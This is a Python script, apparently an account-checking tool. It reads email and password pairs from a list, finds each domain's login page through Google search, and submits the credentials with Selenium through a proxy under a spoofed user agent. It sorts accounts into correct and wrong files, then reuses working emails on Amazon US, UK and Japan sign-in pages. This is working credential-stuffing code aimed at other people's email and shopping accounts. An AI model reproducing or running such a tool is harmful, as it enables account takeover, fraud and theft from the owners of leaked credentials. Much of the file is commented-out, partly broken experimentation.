from selenium import webdriver
from time import sleep
from urllib import request
import random
import re
import sys
from html import parser
from bs4 import BeautifulSoup
import lxml
from googlesearch import search

import urllib,threading,queue,os
from urllib import parse
import msvcrt
import simplejson
import sys
import time






file=open("pw.txt")
fileR=open("correct.txt","a")
fileN=open("hostnofound.txt","a")
fileW=open("wrong.txt","a")

host=''
user_agents = ['Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0',
         'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0',
         'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533+ \
         (KHTML, like Gecko) Element Browser 5.0',
         'IBM WebExplorer /v0.94', 'Galaxy/1.0 [en] (Mac OS X 10.5.6; U; en)',
         'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
         'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
         'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) \
         Version/6.0 Mobile/10A5355d Safari/8536.25',
         'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) \
         Chrome/28.0.1468.0 Safari/537.36',
         'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; TheWorld)']


#user_agentN = user_agents[index]
index = random.randint(0, 9)
user_agentN = user_agents[index]

ip = '127.0.0.1:8087'
# #设置代理ip访问方式，http和https
proxy = {'http':ip,'https':ip}
# #创建ProxyHandler
proxy_support = request.ProxyHandler(proxy)
# #创建Opener
opener = request.build_opener(proxy_support)
# #添加User Angent
#opener.addheaders = [("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0")]
opener.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0')]
request.install_opener(opener)

#header = [('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0')]
#proxies = {'http':ip,'https':ip}

with file as file_object:
    for line in file_object:
        try:
            username=line.split(' ')[0]
            passwd=line.split(' ')[1]
            print(username)
            print(passwd)
        except:
            pass
        #fileR.write(username)
        #fileR.write(" ")
        #fileR.write(passwd)
        #fileR.write("\n")
        try:
            usr=username.split('@')[0]
            host=username.split('@')[1]
        except:
            pass
        LABAL=0
        tem_url=''
        chooselabel=0
        searchstr=host+'/login/#'

        #index = random.randint(0, 9)
        #user_agentN = user_agents[index]


        for urlg in search(searchstr, tld='com',lang='hk',stop=2, user_agent=user_agentN):
            if chooselabel==0:
                print("正在进入-----"+urlg)
                chooselabel=1
                tem_url=urlg
            else:
                pass
        #queryStr = urllib.request.quote(searchstr)

        #searchstr2 = parse.urlencode({'q' : searchstr})

        #searchstr2 = parser.urlencode()
        #url = 'http://ajax.googleapis.com/ajax/services/search/web?v=1.0&'+ searchstr2
        #+'&source=lnms&tbm=isc'
        #url = 'https://www.google.com.hk/search?hl=en&q=%s'%searchstr
        #request = urllib.request.Request(url)

        #index = random.randint(0, 9)
        # user_agent = user_agents[index]
        # request.add_header('User-agent', user_agent)
        # response = urllib.request.urlopen(request)
        # #response = urllib.request.urlopen(request)
        # html = response.read()


        #print(html)



        #soup = BeautifulSoup(html)
        #tagh3 = soup.find_all("a")
        #
        # tagh2 = soup.find('h3')
        # tagh3 = tagh2.find('a')
        #
        #
        #for h3 in tagh3:
        #    print(h3['href'])
        #     herf=h3.find('a').get('herf')
        #
        #     print(h3['herf'])



        #print(html)
        #soup = BeautifulSoup(html,"lxml")
        #soup = BeautifulSoup(' '.join(html),'lxml')
        #for i in soup.findAll("h3"):
        #for i in soup.findAll(name="h3"):
            #compile_rule = re.compile(r"<a.*?href=https://|http://.*? ")
            #url_list=re.findall(compile_rule,html)
            #for tem_url in url_list:
            #tem_urll = i.find(name="a",attrs="href")
            #
                # if "/url?url=" in tem_url:
                #     tem_url=tem_url.split('/url?url=')[1]
            #else:
                #pass
            #    print(tem_url)
            #    break
            # else:
            #    pass
                # print("\033[1;31m 未能找到url地址，正在将该账号写入 hostnotfound.txt 中...\033[0m")
                # fileN.write(username + " ")
                # fileN.write(passwd + "\n")
        #     tem_url=i.get('href')
        # for tag in soup.find_all(name='a',attrs={'href':re.compile(r"http://\S*")}):
        #     if "login" in tag.get('href'):
        #         print(tag.get('href'))
        #     else:
        #         pass

        # soup = BeautifulSoup(html)
        # bsobj=BeautifulSoup(soup,'html.parser')
        # t1=bsobj.find_all('a')
        # for t2 in t1:
        #     t3=t2.get('herf')
        #     print(t3)


        #ss=html
        #urls = re.findall(r"<a.*?href=.*?<\/a>", ss, re.I)
        #for i in urls:
        #    print(i)

        #results = extractSearchResults(html)

        #selfkey = searchstr.decode('gbk').encode('utf-8')

        #         self.page = str(queue.get())



        #for x in range(5):
        #    page=x*4


        #quotestr = urllib.request.quote(searchstr)
        #url = ('https://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=%s&rsz=8&start=%s') % (quotestr,1)
        #         urllib.quote(self.key), self.page)
        #try:
        #    request = urllib.request.Request(url,None,{'Refer':'http://www.sina.com'})
        #    response = urllib.request.urlopen(request)
            #result = simplejson.load(response)
            #infoa = result['responseData']['result']

        #except:
        #    print("\033[1;31m http解析失败\n \033[0m")


        #else:
        #    for minfo in infoa:
        #        print(minfo)

        #    html=response.read()
        #    print("http 解析成功")
        #except:
        #    print("\033[1;31m http解析失败\n \033[0m")
        #             results = simplejson.load(response)
        #             URLinfo = results['responseData']['results']
        #         except:
        #             print("\033[1;31m http解析失败\n \033[0m")
        #         else:
        #             for info in URLinfo:
        #                 print
        #                 info['url']



        '''host1="https://www."+host+"/login/#"
        host2="https://mail."+host
        host3="https://email."+host+"/login/#"
        host4="https://login."+host+"/login/#"
        #server=smtplib.SMTP(host,25)
        path = "C:\\chromedriver\\chromedriver.exe"
        # path="C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
        # 模拟登陆163邮箱'''
        path = "C:\\chromedriver\\chromedriver.exe"
        driver = webdriver.Chrome(executable_path=path)


        '''
        resp3 = request.urlopen(host3)
        resp1 = request.urlopen(host1)
        resp2 = request.urlopen(host2)
        resp4 = request.urlopen(host4)
        if(resp3==200):
            driver.get(host3)
        elif(resp1==200):
            driver.get(host1)
        elif(resp2==200):
            driver.get(host2)
        elif(resp4==200):
            driver.get(host4)
        else:
            print("http not found")
            fileN.write(username + " ")
            fileN.write(passwd + "\n")
            '''


        # '''try:
        #     #global answer
        #     answer=request.urlopen(host3)'''
        #     '''driver.get(tem_url)
        #     LABAL=1
        #     '''print(answer)'''
        # except:
        #     try:
        #         '''answer=request.urlopen(host4)'''
        #         driver.get(tem_url)
        #         LABAL=1
        #         '''print(answer)'''
        #     except:
        #         try:
        #             '''answer=request.urlopen(host1)'''
        #             driver.get(tem_url)
        #             LABAL=1
        #             '''print(answer)'''
        #         except:
        #             try:
        #                 '''answer=request.urlopen(host2)'''
        #                 driver.get(tem_url)
        #             except:
        #                 print("\033[1;31m 域名解析失败，正在将该账号写入 hostnotfound.txt 中...\033[0m")
        #                 fileN.write(username + " ")
        #                 fileN.write(passwd + "\n")'''
        try:
            driver.get(tem_url)
            LABAL = 1
        except:
            print("url解析错误，正在将该账号写入 hostnotfound.txt 中...")
            fileN.write(username + " ")
            fileN.write(passwd + "\n")

        if(LABAL==1):
            try:
                user = driver.find_element_by_name("user")# 审查元素username的id
                user.clear()
            except:
                try:
                    user = driver.find_element_by_name("email")
                    user.clear()
                except:
                    try:
                        user = driver.find_element_by_name("username")
                        user.clear()
                    except:
                        try:
                            user = driver.find_element_by_name("userid")
                            user.clear()
                        except:
                            fileN.write(username+" ")
                            fileN.write(passwd+"\n")
            try:
                user.send_keys(username)  # 输入账号
            except:
                pass
            try:
                password = driver.find_element_by_name("pass")# 审查元素password的name
                password.clear()
            except:
                try:
                    password = driver.find_element_by_name("password")
                    password.clear()
                except:
                    try:
                        password = driver.find_element_by_name("passwd")
                        password.clear()
                    except:
                        fileN.write(username + " ")
                        fileN.write(passwd + "\n")
            try:
                password.send_keys(passwd)  # 输入密码
            except:
                pass

            Input1=input(" Is this a right account?y/n \n")
            if(Input1=='y'):
                print("\n正在将正确账号写入 correct.txt 中...")
                fileR.write(username + " ")
                fileR.write(passwd + "\n")
                Input2 = input("\033[1;32m Choose to open amazon?A/a=US,U/u=UK,J/j=Japan,N/n=no\n \033[0m")
                if (Input2 == 'A' or Input2=='a'):
                    print("open amazon US...")
                    newwindow = 'window.open("https://www.amazon.com/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&switch_account=")'
                    driver.execute_script(newwindow)
                    # 移动句柄，对新打开页面进行操作
                    driver.switch_to_window(driver.window_handles[1])
                    # driver.get('https://www.amazon.com/ap/signin?_encoding=UTF'
                    #           '8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity'
                    #           '=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%'
                    #           '2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.'
                    #           'amazon.com%2F%3Fref_%3Dnav_custrec_signin&switch_account=')
                    Auser1 = driver.find_element_by_id("ap_email")
                    Auser1.clear()
                    Auser1.send_keys(username)
                    driver.find_element_by_id("continue").click()
                    sleep(2)
                    Apasswd1 = driver.find_element_by_id("continue").click()
                    #Apasswd1.clear()
                    #Apasswd1.send_keys(passwd)
                elif(Input2 == 'U' or Input2=='u'):
                    print("open amazon UK...")
                    newwindow = 'window.open("https://www.amazon.co.uk/ap/signin?openid.return_to=https%3A%2F%2Fwww.amazon.co.uk%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=gbflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&&openid.pape.max_auth_age=0")'
                    driver.execute_script(newwindow)
                    # 移动句柄，对新打开页面进行操作
                    driver.switch_to_window(driver.window_handles[1])
                    Auser2 = driver.find_element_by_id("ap_email")
                    Auser2.clear()
                    Auser2.send_keys(username)
                    driver.find_element_by_id("continue").click()
                    sleep(2)
                    Apasswd2 = driver.find_element_by_id("continue").click()
                    #Apasswd2.clear()
                    #Apasswd2.send_keys(passwd)
                elif(Input2 == 'J' or Input2=='j'):
                    print("open amazon Japan...")
                    newwindow = 'window.open("https://www.amazon.co.jp/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=jpflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2F%3Fref_%3Dnav_custrec_signin&switch_account=")'
                    driver.execute_script(newwindow)
                    # 移动句柄，对新打开页面进行操作
                    driver.switch_to_window(driver.window_handles[1])
                    Auser3 = driver.find_element_by_id("ap_email")
                    Auser3.clear()
                    Auser3.send_keys(username)
                    driver.find_element_by_id("continue").click()
                    sleep(2)
                    Apasswd3 = driver.find_element_by_id("continue").click()
                    #Apasswd3.clear()
                    #Apasswd3.send_keys(passwd)
                else:
                    pass
            else:
                print("\n正在将错误账号写入 wrong.txt 中...")
                fileW.write(username + " ")
                fileW.write(passwd + "\n")

        else:
            try:
                print("\n正在关闭网页...")
                driver.close()
            except:
                #\033[1;31m url错误，正在将该账号写入 hostnotfound.txt 中...\033[0m
                print("\n网页关闭时有异常发生! ")
                pass

        #else:
            #pass

        #host="pop3."+host1
        #print(host)
        #pp=poplib.POP3(host)
        #pp.set_debuglevel(1)
        #pp.user(username)
        #pp.pass_(password)
        #ret=pp.stat()
        #print(ret)
